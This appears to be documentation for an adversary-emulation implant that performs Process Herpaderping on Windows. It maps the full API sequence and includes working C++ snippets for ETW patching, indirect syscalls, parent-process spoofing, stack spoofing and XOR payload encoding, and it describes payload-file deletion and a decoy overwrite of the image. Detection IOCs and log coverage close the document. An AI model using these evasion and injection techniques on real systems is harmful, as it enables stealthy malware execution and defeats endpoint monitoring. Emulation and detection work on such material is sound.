# Process Herpaderping: Ghost Process via SEC_IMAGE Section

## Technique

**MITRE ATT&CK:** T1055 — Process Injection (Herpaderping Variant)

_Herpaderping creates a ghost process by first mapping a payload into a `SEC_IMAGE` section, then spawning a process from that section via `NtCreateProcessEx`. Because `NtCreateProcessEx` does **not** create a primary thread, there is a natural writable window between process creation and thread start. During this window, the on-disk file backing the section is overwritten in-place with innocuous decoy content. The running process therefore has no valid on-disk image — forensic reads see an IIS log while the process executes from the original in-memory section. This is distinct from Process Doppelgänging (T1055.013), which uses NTFS transactions (TxF) — CWLHerpaderping does **not** use TxF._

## Execution Flow

```
wmain()
 └─ PatchEtw()                         ← B1: suppress ETW (T1562.006) [only if ENABLE_ETW_PATCH defined]
 └─ GetPayloadBuffer()
     ├─ GetFileType(STD_INPUT_HANDLE) → check stdin type
     ├─ MODE 1 (stdin pipe - T1620):
     │   ├─ ReadFile(stdin, 4-byte size)
     │   ├─ VirtualAlloc(size)
     │   └─ ReadFile(stdin, payload)    ← reflective: NO disk file
     └─ MODE 2 (file fallback - T1070.004):
         ├─ CreateFileW(PAYLOAD_PATH)
         ├─ ReadFile → heap buffer
         ├─ [#ifdef ENABLE_PAYLOAD_XOR] XOR decode in-place ← T1027.013
         │     └─ decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)
         └─ DeleteFileW(PAYLOAD_PATH)   ← anti-forensic: payload deleted
 └─ Herpaderping(buffer, size)
     ├─ InitSyscallPool / INDIRECT_SYSCALL × 5 ← B2: indirect syscalls (5 injection-critical APIs)
     │     NtCreateSection, NtCreateProcessEx, NtAllocateVirtualMemory,
     │     NtWriteVirtualMemory, NtCreateThreadEx
     ├─ SealSyscallPool()               ← flip stub page to PAGE_EXECUTE_READ
     ├─ GetTempFileNameW (prefix "HD") → hTemp (SHARE_READ, handle kept open)
     ├─ WriteFile(payload → hTemp) + FlushFileBuffers(hTemp)
     ├─ NtCreateSection(SEC_IMAGE, hTemp)         ← snapshot payload as image section
     │     kernel runs MmFlushImageSection — blocks NEW writers; pre-held hTemp survives
     ├─ GetNonJobParent()               ← B3: PPID spoof (svchost/wininit Session 0)
     ├─ NtCreateProcessEx(hSection, hParent, Flags=0) [StackSpoof] ← B5: ghost process, no thread
     ├─ Full in-place decoy overwrite (while totalWritten < payloadSize)
     │     loop IIS log lines via pre-held hTemp → covers ALL payloadSize bytes
     │     (no truncate — active section blocks SetEndOfFile resize)
     │     FlushFileBuffers(hTemp) + CloseHandle(hTemp)
     │     on-disk file is now 100% IIS log content
     ├─ NtQueryInformationProcess(ProcessBasicInformation) → pbi.PebBaseAddress
     ├─ GetEntryPoint(hProcess, payload, pbi) → entryPoint
     ├─ RtlCreateProcessParametersEx(RuntimeBroker.exe) → processParameters [GetProcAddress]
     ├─ NtAllocateVirtualMemory(hProcess, hint=local&~0xFFFF, 64KB-aligned)
     │     pre-aligned hint guarantees remote VA matches local UNICODE_STRING.pBuffer values
     ├─ NtWriteVirtualMemory(hProcess, processParameters, paramSize)
     ├─ NtWriteVirtualMemory(hProcess, &PEB->ProcessParameters, &paramsPtr)
     ├─ NtCreateThreadEx(hProcess, entryPoint) ← ghost process begins execution
     └─ CloseHandle(hSection)           ← section released; temp file stays on disk (innocuous log)
```

## Steps Detail

| Step | API / Action | Description |
|------|-------------|-------------|
| 0 | `PatchEtw()` | Patch `ntdll!EtwEventWrite` → `xor eax,eax; ret` — suppress ETW (T1562.006). **Conditional:** only compiled/called when `ENABLE_ETW_PATCH` is defined at build time. |
| 1a | `GetFileType(STD_INPUT_HANDLE)` | Check if stdin is a pipe (reflective mode trigger) |
| 1b-MODE1 | `ReadFile(stdin)` | Read 4-byte size + payload bytes from stdin pipe — **T1620 Reflective Code Loading** (NO disk file) |
| 1b-MODE2 | `CreateFileW` / `ReadFile` | Read payload from `PAYLOAD_PATH` into heap buffer |
| 1c-MODE2 | XOR decode (in-place, conditional) | `decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)` — **T1027.013** — only when compiled with `ENABLE_PAYLOAD_XOR`; no-op otherwise |
| 2-MODE2 | `DeleteFileW(PAYLOAD_PATH)` | Delete payload file immediately after read — **T1070.004 File Deletion** |
| 3 | `InitSyscallPool` / `INDIRECT_SYSCALL` × 5 | Resolve SSN for 5 injection-critical NT APIs: `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`; `SealSyscallPool()` flips stub page to `PAGE_EXECUTE_READ` |
| 4 | `GetTempFileNameW` / `CreateFileW` | Create temp file in `%TEMP%` with prefix `HD`; open with `GENERIC_READ\|GENERIC_WRITE\|SYNCHRONIZE`, `FILE_SHARE_READ` — handle held open through NtCreateSection to retain pre-existing write permission |
| 5 | `WriteFile(payload → hTemp)` + `FlushFileBuffers` | Write full payload to temp file; flush to guarantee sector commit before section creation |
| 6 | `NtCreateSection(SEC_IMAGE, hTemp)` | Snapshot the payload-on-disk as a `SEC_IMAGE` section. Kernel runs `MmFlushImageSection` — blocks **new** writers but the pre-held `hTemp` handle survives, enabling the later in-place overwrite |
| 7 | `GetNonJobParent()` | Enumerate processes; find `svchost.exe` in Session 0 → fallback `wininit.exe` in Session 0; return `PROCESS_CREATE_PROCESS` handle |
| 8 | `NtCreateProcessEx(hSection, hParent, Flags=0, InJob=FALSE)` **[StackSpoof]** | Create ghost process from the section; `hParent` = spoofed parent; `Flags=0` = no inherit handles; `InJob=FALSE` = don't join parent job object. **No primary thread created** — natural writable window for PEB setup |
| 9 | Full in-place decoy overwrite | `SetFilePointer(0)` + `while (totalWritten < payloadSize)` loop writing IIS W3SVC log lines via pre-held `hTemp`; last partial line truncated to fill exactly `payloadSize` bytes in-place; `FlushFileBuffers` + `CloseHandle(hTemp)` — on-disk file is now pure IIS log content |
| 10 | `NtQueryInformationProcess(ProcessBasicInformation)` | Get `pbi.PebBaseAddress` and `ImageBaseAddress` of the ghost process |
| 11 | `GetEntryPoint(hProcess, payload, pbi)` | Read ghost PEB → `ImageBaseAddress`; parse local payload headers → `AddressOfEntryPoint`; compute absolute VA |
| 12 | `RtlCreateProcessParametersEx(RuntimeBroker.exe)` | Build `RTL_USER_PROCESS_PARAMETERS` with `ImagePathName = RuntimeBroker.exe`, `RTL_USER_PROC_PARAMS_NORMALIZED` flag — all `UNICODE_STRING.pBuffer` pointers become absolute local addresses |
| 13 | `NtAllocateVirtualMemory(hProcess, hint=local&~0xFFFF, allocSize)` | Allocate remote memory at 64KB-aligned hint matching local params VA. Pre-alignment: `hintBase = (ULONG_PTR)processParameters & ~0xFFFF`; `allocSize` covers from `hintBase` past `processParameters + paramSize`, rounded up to 64KB. Guarantees remote VA matches local `UNICODE_STRING.pBuffer` values |
| 14 | `NtWriteVirtualMemory(hProcess, processParameters, paramSize)` | Copy normalized params blob into remote memory at the matching VA |
| 15 | `NtWriteVirtualMemory(hProcess, &PEB->ProcessParameters, &paramsPtr)` | Patch `PEB->ProcessParameters` to point at the written params block |
| 16 | `NtCreateThreadEx(hProcess, entryPoint)` | Create primary thread at payload entry point — ghost process begins execution |
| 17 | `CloseHandle(hSection)` | Release section handle; child process retains its own image mapping. Temp file stays on disk — active image section blocks unlink (`STATUS_CANNOT_DELETE 0xC0000121`), but full in-place overwrite already made it innocuous |

> **Key:** The classic herpaderping pattern uses 3 split NT syscalls (`NtCreateSection` → `NtCreateProcessEx` → `NtCreateThreadEx`) instead of the atomic `NtCreateUserProcess`. `NtCreateProcessEx` does NOT create a primary thread — this is the natural writable window. PEB setup (`NtAllocateVirtualMemory` + `NtWriteVirtualMemory` × 2) fills the gap between process creation and thread start. The on-disk file is already overwritten before `NtCreateThreadEx` fires.

## Patches Applied

### B1 — ETW Patch (`CWLImplant.cpp`)

**Purpose:** `EtwEventWrite` in `ntdll.dll` is the function EDR sensors hook to receive kernel-originated ETW events (e.g., `NtCreateSection`, `NtCreateProcessEx`). Patching it to `xor eax,eax; ret` suppresses those events for the lifetime of the process.

**Conditional compilation:** The entire `PatchEtw()` function and its call in `main()` are wrapped in `#ifdef ENABLE_ETW_PATCH`. The patch is only active when the binary is built with that preprocessor definition. Without it, ETW suppression is skipped entirely.

```cpp
#ifdef ENABLE_ETW_PATCH
static void PatchEtw()
{
    HMODULE hNtdll = GetNtdllBase();
    PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
    if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }
    DWORD old = 0;
    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
    memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
    VirtualProtect(pEtw, 4, old, &old);
}
#endif  // ENABLE_ETW_PATCH
```

When compiled with `ENABLE_ETW_PATCH`, called first in `main()` before any NT API, so DC0021 (OS API Execution) telemetry is suppressed for all subsequent calls.

---

### B2 — Indirect Syscalls (`CWLImplant.cpp`, `syscall.h`)

**Five** injection-critical APIs use indirect syscall stubs built at runtime by `InitSyscallPool`:

```cpp
INDIRECT_SYSCALL(_NtCreateSection,          pNtCreateSection,          NtCreateSection);
INDIRECT_SYSCALL(_NtCreateProcessEx,        pNtCreateProcessEx,        NtCreateProcessEx);
INDIRECT_SYSCALL(_NtAllocateVirtualMemory,  pNtAllocateVirtualMemory,  NtAllocateVirtualMemory);
INDIRECT_SYSCALL(_NtWriteVirtualMemory,     pNtWriteVirtualMemory,     NtWriteVirtualMemory);
INDIRECT_SYSCALL(_NtCreateThreadEx,         pNtCreateThreadEx,         NtCreateThreadEx);
SealSyscallPool();  // flip stub page PAGE_RWX → PAGE_EXECUTE_READ
```

Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11` — the gadget (`syscall;ret`) lives inside `ntdll .text`, so the CPU sees the syscall as originating from `ntdll`, not from the stub page. EDR user-mode hooks in `ntdll` are bypassed.

Non-syscall helpers (`RtlCreateProcessParametersEx`, `RtlInitUnicodeString`, `NtQueryInformationProcess`, `RtlImageNtHeader`, `NtReadVirtualMemory`) are resolved via `RESOLVE_API` (EAT-walk), not indirect syscalls.

---

### B3 — PPID Spoofing — `GetNonJobParent()` (`CWLImplant.cpp`)

**Purpose:** `NtCreateProcessEx` inherits session and job-object constraints from its `ParentProcess` handle. On IIS servers, the caller may be inside an IIS Job Object. Using a Session 0 non-PPL process as parent places the ghost in Session 0 with no Job Object.

```cpp
static HANDLE GetNonJobParent()
{
    const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                    DWORD sid = 0xFFFF;
                    ProcessIdToSessionId(pe.th32ProcessID, &sid);
                    if (sid != 0) continue;  // reject Session 1+ (interactive users)
                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                    if (h) { CloseHandle(hSnap); return h; }
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return GetCurrentProcess();  // fallback: no spoof
}
```

**Why `svchost.exe` first:** On Windows Server 2022, `wininit.exe` and `services.exe` may restrict `PROCESS_CREATE_PROCESS` even from SYSTEM. `svchost.exe` is non-PPL, always in Session 0, and reliably accessible.

**Token note:** `NtCreateProcessEx` inherits the spoofed parent's token (unlike `NtCreateUserProcess` which inherits the caller's). Since both the caller (`CertEnrollAgent.exe` running as SYSTEM via EfsPotato) and the spoofed parent (`svchost.exe` = SYSTEM) carry SYSTEM tokens, no token fixup is needed.

---

### B4 — Token Fixup — **Not Required**

No `NtSetInformationProcess(ProcessAccessToken=9)` token fixup is performed. `NtCreateProcessEx` inherits the spoofed parent's (`svchost.exe`) token, which is SYSTEM — matching the caller's token. The `_NtSetInformationProcess` typedef is retained in `CWLInc.h` for structural completeness but the function is never called.

---

### B5 — Stack Spoofing (`StackSpoof.cpp` / `StackSpoof.h`)

The `NtCreateProcessEx` indirect syscall call is wrapped with `StackSpoofer`:

```cpp
StackSpoofer spoofer(OBFSTR("kernel32.dll"));
spoofer.Activate();
status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent,
                             0, hSection, NULL, NULL, FALSE);
spoofer.Deactivate();
```

`Activate()` plants a fake return address inside `kernel32.dll` on the stack before the syscall. EDR stack-walk inspection sees the call as originating from `kernel32.dll`, not from the stub page or the PE. `NtCreateThreadEx` is an indirect syscall but not stack-spoofed.

---

### B6 — XOR Payload Decode (`CWLImplant.cpp`, `GetPayloadBuffer` Mode 2)

**Purpose:** On-disk payload file is stored XOR-encoded so it does not have a valid MZ header. The binary decodes it in memory before use, preventing static AV from identifying the file as a PE. **T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File.**

**Conditional compilation:** Entire decode block is wrapped in `#ifdef ENABLE_PAYLOAD_XOR`. Without it, the raw file bytes are used directly.

**Applies to Mode 2 only.** Mode 1 (stdin pipe) receives plain PE bytes — no XOR in the pipe path.

```cpp
#ifdef ENABLE_PAYLOAD_XOR
const BYTE PAYLOAD_XOR_BASE = 0xA3;
const BYTE PAYLOAD_XOR_STEP = 0x5B;
for (size_t i = 0; i < p_size; i++)
    bufferAddress[i] ^= (BYTE)((PAYLOAD_XOR_BASE + i * PAYLOAD_XOR_STEP) & 0xFF);
#endif
```

Formula is self-inverse (XOR): encoding and decoding use the same function. First byte: `0x4D ('M') ^ 0xA3 = 0xEE` — the encoded file does not start with `MZ`.

---

### Combined Effect

| Scenario | Ghost PPID | Ghost Session | Ghost Token |
|---|---|---|---|
| No patches | `CertEnrollAgent.exe` | Inherited from caller | Inherited from svchost (SYSTEM) |
| PPID patch (current) | `svchost.exe` | Session 0 | **Inherited from svchost (SYSTEM)** — correct since caller is also SYSTEM |

> `NtCreateProcessEx` inherits the spoofed **parent's** token. Since the spoofed parent (`svchost.exe`) runs as SYSTEM and the caller (`CertEnrollAgent.exe`) also runs as SYSTEM via EfsPotato, the inherited token is correct without any explicit fixup.

## Payload Loading Modes

### Mode 1: Reflective Loading via Stdin (T1620)

**Trigger:** Parent process spawns `CertEnrollAgent.exe` with stdin pipe redirection

**Example (Node.js):**
```javascript
const result = child_process.spawnSync(
    'C:/ProgramData/CertEnrollAgent.exe',
    [],
    { input: payloadBuffer } // stdin redirected with PE bytes
);
```

**Payload format:** 4-byte little-endian size header + PE file bytes

**Key benefit:** Payload **never written to disk** - loaded directly into memory from pipe

**ATT&CK:** T1620 Reflective Code Loading

### Mode 2: File-based Loading with Deletion (T1070.004)

**Trigger:** Stdin is not a pipe (normal console or file handle)

**Default compile-time path (`CWLImplant.cpp`):**

```cpp
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
#endif
```

**Override at build time via MSBuild (used in emulation plan):**

```powershell
msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 `
    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" /t:Rebuild /m
```

**Key behavior:** Payload read from disk then **immediately deleted** via `DeleteFileW`

**ATT&CK:** T1070.004 Indicator Removal: File Deletion

**Emulation plan usage:**
- Mode 2 (file-based) is the primary path when spawned by EfsPotato as SYSTEM with no stdin pipe; reads `CertCA.bin` (XOR-decoded if built with `ENABLE_PAYLOAD_XOR`) then deletes it
- Mode 1 (reflective) is the alternate path when react2shell spawns the binary with `[4-byte LE size][PE bytes]` on stdin

## Payload Requirements

- Format: Portable Executable (.exe), not raw shellcode
- Architecture: x64
- Entry point: Standard PE entry point (`AddressOfEntryPoint`)
- Self-contained: no external DLL dependencies at load time

## IOCs for Detection

### Mode 1 (Reflective Loading) Indicators:
- Parent process spawns the loader with stdin pipe containing `[4-byte LE size][PE bytes]`
- `GetFileType(STD_INPUT_HANDLE)` returns `FILE_TYPE_PIPE` in the loader process
- **No payload file on disk** — payload transferred entirely via pipe
- Process creation event shows stdin redirection

### Mode 2 (File-based) Indicators:
- `CreateFileW` + `ReadFile` on payload path (e.g., `C:\ProgramData\CertCA.bin`)
- `DeleteFileW` called immediately after read — file creation followed by deletion within seconds
- Payload file exists briefly then disappears

### XOR Decode (Mode 2, `ENABLE_PAYLOAD_XOR` only):
- Payload file on disk (`CertCA.bin`) does **not** start with `MZ` (first byte = `0xEE`)
- In-memory payload is a valid PE after decode — discrepancy between on-disk bytes and in-process memory
- `CertCA.bin` → `0xEE` first byte; decoded buffer → `0x4D` (`M`) first byte

### Common Indicators (Both Modes):
- Process whose on-disk image (`HD*.tmp`) contains IIS W3SVC log content that does not match the in-memory image
- `NtCreateSection(SEC_IMAGE)` + `NtCreateProcessEx` called with section from temp file path; `NtCreateThreadEx` into ghost process — classic 3-syscall herpaderping sequence
- `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` while the actual image loaded is from `HD*.tmp`
- PPID of ghost process resolves to `svchost.exe` or `wininit.exe` in Session 0 despite the real parent being a non-service process
- Stack return address in `kernel32.dll` for the `NtCreateProcessEx` syscall (fake return planted by StackSpoofer)
- `EtwEventWrite` in `ntdll` patched to `xor eax,eax; ret` in calling process memory (only when built with `ENABLE_ETW_PATCH`)
- `HD*.tmp` created in `%TEMP%`, written with payload, overwritten with IIS log content — file stays on disk (active image section blocks deletion)
- API sequence: `NtCreateSection(SEC_IMAGE)` → `NtCreateProcessEx` → decoy overwrite → `NtQueryInformationProcess` → `RtlCreateProcessParametersEx(RuntimeBroker.exe)` → `NtAllocateVirtualMemory` (64KB hint) → `NtWriteVirtualMemory` × 2 (params + PEB) → `NtCreateThreadEx`
- **No file deletion** of the temp file — `STATUS_CANNOT_DELETE (0xC0000121)` when active image section is mapped; file remains on disk with full IIS log content

## Log Sources Coverage

| Data Component | Log Source | Channel/Event | Notes |
|---|---|---|---|
| Process Creation (DC0032) | WinEventLog:Sysmon | EventCode=1 | ❌ Ghost process — `ImageFileName` shows `RuntimeBroker.exe` but on-disk file is IIS log content |
| Process Access (DC0035) | WinEventLog:Sysmon | EventCode=10 | ✅ Yes — process open events visible for `NtCreateProcessEx` parent handle operations |
| File Creation (DC0016) | WinEventLog:Sysmon | EventCode=11 | ✅ `HD*.tmp` created; overwritten with decoy; stays on disk |
| OS API Execution (DC0021) | ETW:Microsoft-Windows-Kernel-Process | `NtCreateSection`, `NtCreateProcessEx`, `NtCreateThreadEx` | ⚠️ Suppressed only when binary compiled with `ENABLE_ETW_PATCH`; visible otherwise |
| Thread Creation (DC0019) | WinEventLog:Sysmon | EventCode=8 | ⚠️ `NtCreateThreadEx` called from caller process into ghost process — visible as remote thread creation; unlike `NtCreateUserProcess` (atomic), this is a separate externally-visible cross-process thread injection event |
